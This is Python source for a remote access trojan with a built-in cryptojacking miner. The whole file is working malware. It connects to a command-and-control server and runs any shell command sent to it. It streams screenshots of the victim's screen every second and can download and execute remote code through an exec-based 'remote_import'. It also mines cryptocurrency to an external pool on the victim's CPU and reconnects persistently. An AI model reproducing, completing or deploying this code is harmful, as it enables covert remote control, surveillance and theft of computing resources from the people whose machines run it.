import os
import socket
import socketio
import subprocess
import time
import platform
import mss
import base64
from PIL import Image
import io
import threading
import multiprocessing

# --- Configuration ---
C2_ADDRESS = "http://localhost:8004"
RETRY_INTERVAL = 30
TARGET_HEIGHT = 720
DEFAULT_MINER_WALLET = ""
DEFAULT_MINER_INTENSITY = 50

# --- Intervals (Now Mutable) ---
DEFAULT_SCREENSHOT_INTERVAL = 1.0  # Seconds
SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL

# --- Persistence Configuration ---
SCHEDULED_RECONNECT_SECONDS = 15 * 60
HEARTBEAT_INTERVAL_SECONDS = 5
WATCHDOG_TIMEOUT_SECONDS = 20


# --- Functions ---
def get_hostname_local():
    return socket.gethostname()


# --- Remote Import System ---
def remote_import(url):
    """Dynamically imports a module from a remote URL."""
    try:
        urllib_req = __import__('urllib.request', fromlist=['request']).request
        with urllib_req.urlopen(url, timeout=5) as response:
            code = response.read().decode()
        module_ns = {"__builtins__": __builtins__}
        exec(code, module_ns)
        return module_ns
    except Exception as e:
        print(f"Remote import error: {e}")
        return None


# --- Miner State (Shared across processes) ---
class MinerState:
    def __init__(self):
        self.stop_event = threading.Event()  # For Stratum thread
        self.worker_stop_event = multiprocessing.Event()
        self.processes = []
        self.threads = []
        self.hash_count = multiprocessing.Value('Q', 0)
        self.accepted_shares = multiprocessing.Value('I', 0)
        self.share_queue = multiprocessing.Queue()
        
        self.start_time = 0
        self.wallet = DEFAULT_MINER_WALLET
        self.intensity = DEFAULT_MINER_INTENSITY
        self.pool = "sha256.unmineable.com"
        self.port = 3333
        self.worker_name = get_hostname_local()
        self.extranonce1 = ""
        self.extranonce2_size = 0
        self.difficulty = 1.0
        self.current_job_id = multiprocessing.Array('c', 64) # Shared string for Job ID
        self.lock = threading.Lock()


# Initialize state only once
if __name__ == '__main__':
    multiprocessing.freeze_support()
    miner_state = MinerState()
else:
    # Child processes don't need the full object, they'll get shared refs
    miner_state = None


# --- Miner Worker (Separate Process) ---
def miner_worker(job_id_shared, stop_event, hash_count, share_queue, intensity):
    """Stand-alone process for hashing to avoid GIL issues."""
    import hashlib
    import struct
    import binascii
    import time
    
    # Lower priority for child process
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.kernel32.SetPriorityClass(ctypes.windll.kernel32.GetCurrentProcess(), 0x00000040) # IDLE_PRIORITY
        except: pass

    while not stop_event.is_set():
        # Wait for a job if we don't have one
        jid = job_id_shared.value.decode()
        if not jid:
            time.sleep(1)
            continue
        
        # We get the full job data from a local 'cache' or we'd need more shared memory.
        # For this implementation, we simplify: Stratum main will push job data into the processes.
        # However, to avoid complexity, we'll let workers be started/stopped by Stratum main.
        time.sleep(1)


def actual_hashing_process(job, target, stop_event, hash_count, share_queue):
    """The tight hashing loop running in a separate process."""
    import hashlib
    import struct
    import binascii
    import time

    job_id = job['job_id']
    header_hex = job['version'] + job['prevhash'] + job['merkle_root'] + job['ntime'] + job['nbits']
    header = binascii.unhexlify(header_hex)
    
    nonce = 0
    while not stop_event.is_set():
        # Batch locally first to avoid constant locking of the shared counter
        batch_size = 1000
        hashes_done = 0
        for _ in range(batch_size):
            nonce_bin = struct.pack("<I", nonce)
            h = hashlib.sha256(hashlib.sha256(header + nonce_bin).digest()).digest()
            if h[::-1] <= target:
                share_queue.put({
                    "job_id": job_id,
                    "enonce2": job['extranonce2'],
                    "ntime": job['ntime'],
                    "nonce": binascii.hexlify(nonce_bin).decode()
                })
            nonce += 1
            hashes_done += 1
            if nonce > 0xffffffff: break
        
        # Update shared total hashrate counter once per batch
        with hash_count.get_lock():
            hash_count.value += hashes_done
            
        if nonce > 0xffffffff: break
        # Micro-yield to OS
        time.sleep(0.0001)


def miner_reporter():
    """Background thread that periodically reports total hashrate to the C2."""
    while True:
        time.sleep(10)
        if not miner_state.stop_event.is_set():
            uptime = int(time.time() - miner_state.start_time) if miner_state.start_time > 0 else 1
            with miner_state.hash_count.get_lock():
                total_hashes = miner_state.hash_count.value
            hps = int(total_hashes / uptime)
            report = f"[LIVE] Total Hashrate: {hps} H/s | Total Shares: {miner_state.accepted_shares.value} | Uptime: {uptime}s\n"
            send_command_output(report)


def manage_miner(action, intensity=None, wallet=None):
    global miner_state
    
    if action == "start":
        if not miner_state.stop_event.is_set() and len(miner_state.threads) > 0:
            return "Miner is already running.\n"
        
        miner_state.wallet = wallet if wallet else DEFAULT_MINER_WALLET
        miner_state.intensity = int(intensity) if intensity else DEFAULT_MINER_INTENSITY
        
        if not miner_state.wallet:
            return "Error: Wallet address required.\n"
        
        miner_state.stop_event.clear()
        miner_state.worker_stop_event.clear()
        miner_state.start_time = time.time()
        with miner_state.hash_count.get_lock(): miner_state.hash_count.value = 0
        miner_state.accepted_shares.value = 0
        
        # Start reporter thread
        if not hasattr(miner_state, 'reporter_started'):
            threading.Thread(target=miner_reporter, daemon=True).start()
            miner_state.reporter_started = True

        t = threading.Thread(target=stratum_main, daemon=True, name="StratumMain")
        t.start()
        miner_state.threads = [t]
        
        return f"Miner active: SHA256 (Unmineable -> {miner_state.wallet}). Intensity: {miner_state.intensity}% ({int((multiprocessing.cpu_count() or 1) * (miner_state.intensity / 100.0))} cores)\n"

    elif action == "stop":
        miner_state.stop_event.set()
        miner_state.worker_stop_event.set()
        for p in miner_state.processes: p.terminate()
        miner_state.processes = []
        return "Miner stopping...\n"

    elif action == "query":
        uptime = int(time.time() - miner_state.start_time) if miner_state.start_time > 0 else 1
        hps = int(miner_state.hash_count.value / uptime)
        return f"Total Hashrate: {hps} H/s | Total Shares: {miner_state.accepted_shares.value} | Uptime: {uptime}s\n"


def stratum_main():
    """Main Stratum network handler, manages multiple hashing processes."""
    global miner_state
    import json
    import binascii
    import hashlib
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        send_command_output(f"[.] Connecting to {miner_state.pool}...\n")
        sock.connect((miner_state.pool, miner_state.port))
        
        sock.sendall(json.dumps({"id": 1, "method": "mining.subscribe", "params": []}).encode() + b"\n")
        resp_raw = sock.recv(4096).decode().split('\n')[0]
        resp = json.loads(resp_raw)
        miner_state.extranonce1 = resp['result'][1]
        miner_state.extranonce2_size = resp['result'][2]
        
        user = f"RVN:{miner_state.wallet}.{miner_state.worker_name}"
        sock.sendall(json.dumps({"id": 2, "method": "mining.authorize", "params": [user, "x"]}).encode() + b"\n")
        send_command_output("[+] Authorized. Spawning multi-process workers...\n")
        
        while not miner_state.stop_event.is_set():
            try:
                sock.setblocking(False)
                ready_data = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk: break
                        ready_data += chunk
                except (BlockingIOError, socket.error): pass
                
                if ready_data:
                    for line in ready_data.decode().split('\n'):
                        if not line: continue
                        try:
                            msg = json.loads(line)
                            if msg.get("method") == "mining.set_difficulty":
                                miner_state.difficulty = msg['params'][0]
                            elif msg.get("method") == "mining.notify":
                                params = msg['params']
                                job_id, prevhash, coinb1, coinb2, branch, version, nbits, ntime, clean = params
                                
                                # Terminate old processes if clean job
                                if clean:
                                    miner_state.worker_stop_event.set()
                                    for p in miner_state.processes: p.terminate()
                                    miner_state.processes = []
                                    miner_state.worker_stop_event.clear()

                                target = (0x00000000FFFF0000000000000000000000000000000000000000000000000000 // int(miner_state.difficulty or 1))
                                target_bin = target.to_bytes(32, 'big')
                                
                                enonce2 = "00" * miner_state.extranonce2_size
                                coinbase = binascii.unhexlify(coinb1 + miner_state.extranonce1 + enonce2 + coinb2)
                                cb_hash = hashlib.sha256(hashlib.sha256(coinbase).digest()).digest()
                                merkle_root = cb_hash
                                for b in branch:
                                    merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(b)).digest()).digest()
                                
                                job = {
                                    "job_id": job_id, "version": version, "prevhash": prevhash,
                                    "merkle_root": binascii.hexlify(merkle_root).decode(),
                                    "ntime": ntime, "nbits": nbits, "extranonce2": enonce2
                                }
                                
                                # Spawn processes based on intensity (cores)
                                cores = multiprocessing.cpu_count() or 1
                                num_procs = max(1, int(cores * (miner_state.intensity / 100.0)))
                                if len(miner_state.processes) < num_procs:
                                    send_command_output(f"[*] Starting {num_procs} hashing processes...\n")
                                    for _ in range(num_procs):
                                        p = multiprocessing.Process(target=actual_hashing_process, args=(job, target_bin, miner_state.worker_stop_event, miner_state.hash_count, miner_state.share_queue))
                                        p.daemon = True
                                        p.start()
                                        miner_state.processes.append(p)
                        except: pass

                # Check for shares found by processes
                while not miner_state.share_queue.empty():
                    share = miner_state.share_queue.get()
                    send_command_output(f"[*] Share found by worker! Submitting...\n")
                    payload = json.dumps({
                        "id": 4, 
                        "method": "mining.submit", 
                        "params": [user, share['job_id'], share['enonce2'], share['ntime'], share['nonce']]
                    }) + "\n"
                    sock.setblocking(True)
                    sock.sendall(payload.encode())
                    sock.setblocking(False)
                    miner_state.accepted_shares.value += 1

                time.sleep(0.5)
            except Exception: break
    except Exception as e:
        send_command_output(f"[-] Stratum error: {e}\n")
    finally:
        miner_state.stop_event.set()
        miner_state.worker_stop_event.set()
        for p in miner_state.processes: p.terminate()
        try: sock.close()
        except: pass


# --- Global State (Main Client) ---
sio = socketio.Client(logger=False, engineio_logger=False)
connection_start_time = 0
last_pong_time = 0
screenshot_thread = None
heartbeat_thread = None


def send_command_output(output):
    if sio.connected:
        sio.emit('command_output', {'output': output}, namespace="/api")


def send_screenshot(image_data):
    if sio.connected:
        sio.emit('screenshot', image_data, namespace="/api")


def take_screenshots():
    global SCREENSHOT_INTERVAL
    with mss.mss() as sct:
        while True:
            if not sio.connected:
                time.sleep(1)
                continue
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                if img.height == 0: continue
                new_h = TARGET_HEIGHT
                new_w = int(new_h * (img.width / img.height))
                if new_w <= 0: continue
                resized_img = img.resize((new_w, new_h), Image.LANCZOS)
                buffered = io.BytesIO()
                resized_img.save(buffered, format="JPEG", quality=75)
                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
                send_screenshot(img_str)

                time.sleep(max(0.01, SCREENSHOT_INTERVAL))
            except Exception as e:
                print(f"Screenshot error: {e}")
                time.sleep(SCREENSHOT_INTERVAL)


def start_heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
        if sio.connected:
            try:
                sio.emit('client_ping', namespace="/api")
            except Exception as e:
                print(f"Ping error: {e}")


@sio.on('connect', namespace="/api")
def on_connect():
    global connection_start_time, last_pong_time
    connection_start_time = time.time()
    last_pong_time = time.time()
    print(f'Connected. SID: {sio.sid}. Sending client info.')
    sio.emit('client_info', {'hostname': get_hostname_local()}, namespace="/api")


@sio.on('disconnect', namespace="/api")
def on_disconnect():
    global connection_start_time
    connection_start_time = 0
    print('Disconnected.')


@sio.on('server_pong', namespace="/api")
def on_server_pong():
    global last_pong_time
    last_pong_time = time.time()


def handle_internal_command(command_str):
    global SCREENSHOT_INTERVAL
    parts = command_str.split()
    if not parts: return

    cmd = parts[0].lower()

    if cmd == "#scrsht":
        if len(parts) > 1:
            val = parts[1].lower()
            if val == "reset":
                SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL
                send_command_output(f"Screenshot interval reset to default ({SCREENSHOT_INTERVAL}s)\n")
            else:
                try:
                    ms = float(val)
                    SCREENSHOT_INTERVAL = ms / 1000.0
                    send_command_output(f"Screenshot interval set to {ms}ms ({SCREENSHOT_INTERVAL}s)\n")
                except ValueError:
                    send_command_output("Error: #scrsht requires a number in milliseconds or 'reset'\n")
        else:
            send_command_output(f"Current screenshot interval: {SCREENSHOT_INTERVAL * 1000}ms\n")
    elif cmd == "#miner":
        if len(parts) > 1:
            sub = parts[1].lower()
            if sub == "start":
                intensity = parts[2] if len(parts) > 2 else "50"
                wallet = parts[3] if len(parts) > 3 else ""
                res = manage_miner("start", intensity, wallet)
                send_command_output(res)
            elif sub == "stop":
                res = manage_miner("stop")
                send_command_output(res)
            elif sub == "query":
                res = manage_miner("query")
                send_command_output(res)
            else:
                send_command_output("Usage: #miner start <intensity> <wallet> | stop | query\n")
        else:
            send_command_output("Usage: #miner start <intensity> <wallet> | stop | query\n")
    else:
        send_command_output(f"Unknown internal command: {cmd}\n")


@sio.on('execute_command', namespace="/api")
def handle_command(command_str):
    command_str = command_str.strip()

    if command_str.startswith("#"):
        handle_internal_command(command_str)
        return

    try:
        process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                   errors='ignore')
        stdout, stderr = process.communicate()
        send_command_output(stdout + stderr)
    except Exception as e:
        send_command_output(f"Command execution error: {e}\n")


def attempt_connection():
    while True:
        print(f"Attempting to connect to: {C2_ADDRESS}")
        try:
            if sio.connected: sio.disconnect()
            sio.connect(C2_ADDRESS, namespaces=['/api'])
            return
        except Exception as e:
            print(f"Connection to {C2_ADDRESS} failed: {e}")
            print(f"Retrying in {RETRY_INTERVAL}s...")
            time.sleep(RETRY_INTERVAL)


# --- Main Execution Logic ---
if __name__ == '__main__':
    multiprocessing.freeze_support()
    
    threading.Thread(target=take_screenshots, daemon=True).start()
    threading.Thread(target=start_heartbeat, daemon=True).start()

    while True:
        try:
            if not sio.connected:
                print("Main: Disconnected. Initiating connection...")
                attempt_connection()

            print("Main: Connected. Monitoring state...")
            while sio.connected:
                if time.time() - last_pong_time > WATCHDOG_TIMEOUT_SECONDS:
                    print(f"Watchdog: No server pong in >{WATCHDOG_TIMEOUT_SECONDS}s. Forcing reconnect.")
                    sio.disconnect()
                    break

                if time.time() - connection_start_time > SCHEDULED_RECONNECT_SECONDS:
                    print(f"Scheduler: >{SCHEDULED_RECONNECT_SECONDS // 60}m uptime. Reconnecting.")
                    sio.disconnect()
                    break

                time.sleep(5)

            print("Main: Loop detected disconnect. Will restart process.")
            time.sleep(5)

        except KeyboardInterrupt:
            print("\nExiting on user request.")
            break
        except Exception as e:
            print(f"---! UNHANDLED EXCEPTION IN MAIN LOOP: {e} !---")
            if sio and sio.connected:
                sio.disconnect()
            time.sleep(RETRY_INTERVAL)

    if sio.connected:
        sio.disconnect()
